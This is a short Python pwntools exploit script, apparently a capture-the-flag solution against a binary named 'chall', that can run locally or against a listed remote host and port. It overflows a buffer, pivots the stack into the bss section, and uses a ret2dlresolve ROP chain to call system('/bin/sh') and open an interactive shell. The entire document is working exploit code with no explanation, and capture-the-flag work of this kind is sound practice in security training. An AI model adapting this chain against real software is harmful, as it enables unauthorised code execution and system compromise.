from pwn import *
from sys import *

context.arch = "amd64"


elf = ELF('chall')

p = process('./chall')
HOST = '103.152.242.172'
PORT = 60901

cmd = """
b*0x401168
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, "system", ["/bin/sh"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
print(rop.dump())


payload = b'A'*0x200
payload += p64(elf.bss()+0x800)
payload += p64(0x000000000040113E) #kesini
p.send(payload)

payload = b'B'*0x200
payload += p64(elf.bss()+0x808)
payload += p64(0x000000000040113E)
p.send(payload)

p.send((rop.chain()).ljust(0x210, b"\x00"))
#gdb.attach(p,cmd)
p.send(dlresolve.payload)
p.interactive()